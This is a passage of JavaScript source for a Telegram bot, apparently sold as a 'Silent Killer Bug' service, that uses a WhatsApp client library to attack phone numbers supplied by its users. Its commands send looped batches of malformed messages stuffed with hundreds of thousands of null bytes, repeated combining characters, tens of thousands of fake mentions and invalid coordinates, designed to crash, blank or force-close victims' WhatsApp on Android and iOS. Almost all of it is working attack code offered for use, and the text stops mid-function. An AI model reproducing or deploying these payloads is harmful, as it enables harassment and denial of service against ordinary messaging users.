    await WidixBlankUi(target);
    await sleep(800);
    await WidixCrashAndro(sock, target);
    await sleep(1300);
    await ForcloseClick(sock, target);
    await sleep(3000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>𝑺𝒊𝒍𝒆𝒏𝒕 𝑲𝒊𝒍𝒍𝒆𝒓 𝑨𝒕𝒕𝒂𝒄𝒌</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Crash Ui
⌑ Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ 𝑪𝒆𝒌 ☇ 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("XCrashIoss", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /XCrashIoss 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, Widix, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ 𝑺𝒊𝒍𝒆𝒏𝒕 𝑲𝒊𝒍𝒍𝒆𝒓 𝑩𝒖𝒈 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Crash Ios
⌑ Status: Process
⌑ Developer : zhatanixx.t.me
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ 𝑪𝒆𝒌 ☇ 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 100; i++) {
    await WidixDelayInvis(sock, target);
    await sleep(800);
    await WidixCrashAndro(sock, target);
    await sleep(1000);
    await ForcloseClick(sock, target);
    await sleep(3000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>𝑺𝒊𝒍𝒆𝒏𝒕 𝑲𝒊𝒍𝒍𝒆𝒓 𝑨𝒕𝒕𝒂𝒄𝒌</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Crash Ios
⌑ Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ 𝑪𝒆𝒌 ☇ 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("XblankAndro", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /XblankAndro 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, Widix, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ 𝑺𝒊𝒍𝒆𝒏𝒕 𝑲𝒊𝒍𝒍𝒆𝒓 𝑩𝒖𝒈 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Blank Android 
⌑ Status: Process
⌑ Developer : zhatanixx.t.me
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ 𝑪𝒆𝒌 ☇ 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 120; i++) {
    await WidixCrashAndro(sock, target);
    await sleep(800);
    await WidixDelayInvis(sock, target);
    await sleep(1000);
    await WidixCrashAndro(sock, target);
    await sleep(2000);
    await ForcloseClick(sock, target);
    await sleep(3000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>𝑺𝒊𝒍𝒆𝒏𝒕 𝑲𝒊𝒍𝒍𝒆𝒓 𝑨𝒕𝒕𝒂𝒄𝒌</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Blank Android 
⌑ Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ 𝑪𝒆𝒌 ☇ 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("XForceloseIos", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /XForceloseIos 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, Widix, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ 𝑺𝒊𝒍𝒆𝒏𝒕 𝑲𝒊𝒍𝒍𝒆𝒓 𝑩𝒖𝒈 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Forcelose Ios
⌑ Status: Process
⌑ Developer : zhatanixx.t.me
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ 𝑪𝒆𝒌 ☇ 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 50; i++) {
    await IphoneFcByWidix(target);
    await sleep(800);
    await WidixDelayInvis(sock, target);
    await sleep(1000);
    await WidixForceloseSpam(sock, target);
    await sleep(2000);
    await ForcloseClick(sock, target);
    await sleep(3000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>𝑺𝒊𝒍𝒆𝒏𝒕 𝑲𝒊𝒍𝒍𝒆𝒓 𝑨𝒕𝒕𝒂𝒄𝒌</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Forcelose Ios
⌑ Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ 𝑪𝒆𝒌 ☇ 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${q}` }
      ]]
    }
  });
});


///==========[ TAROK FUNCT LU ]==========\\\
async function WidixDelayInvis(sock, target) {  
  var msg = generateWAMessageFromContent(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "WIDIX",
            format: "EXTENSION"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"k\",\"landmark_area\":\"k\",\"address\":\"k\",\"tower_number\":\"k\",\"city\":\"Japanese\",\"name\":\"k\",\"phone_number\":\"555555\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"k | ${"\u0000".repeat(900000)}\"}}`,
            version: 3
          }
        }
      }
    }
  }, { userJid: target });

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

async function WidixDlayInvisss(sock, target) {
  let msg = {
    groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "DELAY_INVISIBLE_BY_WIDIX" + "\n"
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "[".repeat(10000),
                            buttons: "\u0000".repeat(250000) + "\x10".repeat(250000)
                        }
                    }
                }
            }
        };

  await sock.relayMessage(target, msg, {
    participant: { jid: target }
  });
  
  console.log("✅ DELAY INVIS SUCCESS SEND BUGS");
}

async function WidixVisible(target) {
            await sock.relayMessage(target, {
            viewOnceMessage: {
            message: {
            interactiveResponseMessage: {
            body: {
            text: "SILENT_KILLER",
            format: "DEFAULT"
                    },
            nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"k\",\"landmark_area\":\"k\",\"address\":\"k\",\"tower_number\":\"k\",\"city\":\"Japanese\",\"name\":\"k\",\"phone_number\":\"555555\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"k | ${"\u0000".repeat(900000)}\"}}`,
                version: 3
               }
            }
            }
            }
            }, { participant: { jid: target}});
    
    console.log(chalk.yellow('DELAY VISIBLE SUCCESFULLY'));
}

async function WidixBuldoZerr(target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function WidixCrashAndro(sock, target) {
    try {
        const msg = await generateWAMessageFromContent(
            target,
            {
                newsletterAdminInviteMessage: {
                    newsletterJid: "120363423038562425@newsletter",
                    newsletterName: "𓆩᬴𓆪".repeat(50000),
                    caption: "ꦾ".repeat(50000),
                    inviteCode: "ꦽ".repeat(50000),
                    contextInfo: {
                        locationMessage: {
                            degreesLatitude: 23045678087,
                            degreesLongitude: 23045678087,
                            name: "galaxy_message"
                        },
                        forwardingScore: 99999,
                        isForwarded: true,
                        quotedMessage: {
                            locationMessage: {
                                degreesLatitude: 91,
                                degreesLongitude: 181,
                                name: "call_permission_request"
                            }
                        },
                        externalAdReply: {
                            title: ".",
                            body: ".",
                            mediaType: 1,
                            thumbnail: null,
                            sourceUrl: "https://",
                            showAdAttribution: true,
                            renderLargerThumbnail: true,
                            locationMessage: {
                                degreesLatitude: 1010101,
                                degreesLongitude: 1010101,
                                name: "single_select"
                            }
                        }
                    }
                }
            },
            {
                forwardingScore: 99999,
                isForwarded: true,
                participant: { jid: target }
            }
        );
        
        await sock.relayMessage(target, msg.message, {
            messageId: msg.key.id
        });
        
        console.log(`Widix Crash Succses Send: ${target}`);
        
    } catch(e) {
        console.log(`❌ Error Lek:`, e.message);
    }
}

async function WidixBlankUi(target) {
  const payloads = [
    {
      viewOnceMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "120363423038562425@newsletter",
            newsletterName: "ꦾ".repeat(5000),
            caption: "ꦾ".repeat(5000),
            inviteExpiration: Date.now() + 9999999999
          }
        }
      }
    },
    {
      stickerMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
        fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
        fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
        mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
        mimetype: "image/webp",
        directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
        fileLength: "10610",
        mediaKeyTimestamp: "1775044724"
      }
    }
  ];
  
  for(let i = 0; i < 30; i++) {
    for(const payload of payloads) {
      await sock.relayMessage(target, payload, {});
      await new Promise(r => setTimeout(r, 200));
    }
  }
}

async function IphoneFcByWidix(target) {
const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000); 
const s = "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessagex = {
         degreesLatitude: 11.11,
         degreesLongitude: -11.11,
         name: " ‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
         url: "https://t.me/zhatanixx",
      }
      let msgx = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessagex
            }
         }
      }, {});
      let extendMsgx = {
         extendedTextMessage: { 
            text: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + s,
            matchedText: "helow",
            description: "𑇂𑆵𑆴𑆿".repeat(60000),
            title: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
            previewType: "NONE",
            jpegThumbnail: "",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msgx2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsgx
            }
         }
      }, {});
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, 
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "SILENT_KILLER" + TravaIphone, 
            matchedText: "WIDIX_BWI",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "WIDIX.#FLOWERS" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      
      for (let i = 0; i < 10; i++) {
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msgx.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msgx2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
     
      await sock.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
          if (i < 9) {
    await new Promise(resolve => setTimeout(resolve, 5000));
  }
      }
   } catch (err) {
      console.error(err);
   }
};

async function WidixForceloseClik(target) {
 for (let n = 0; n < 100; n++) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      body: { 
        text: "WIDIX.#FLOWERS" 
        },
        nativeFlowMessage: {
          buttons: [
           {
              name: (["inapp_signup", "booking_status", "galaxy_message"][(n + (Math.random() < 0.5 ? 1 : 0)) % 3]),
              buttonParamsJson: `{}`
            }
          ]
        }
      }
    }, 
      { 
        participant: {
        jid: target 
       }
     }
   );
 }
}

async function WidixForceloseSpam(sock, target) {
  let msg = generateWAMessageFromContent(
    target,
    {
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=",
        caption: "CSMX",
        fileLength: "149502",
        height: 1397,
        width: 1126,
        mediaKey: "5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=",
        fileEncSha256: "XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=",
        directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1777621571",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
        contextInfo: {
          pairedMediaType: "NOT_PAIRED_MEDIA",
          isQuestion: true,
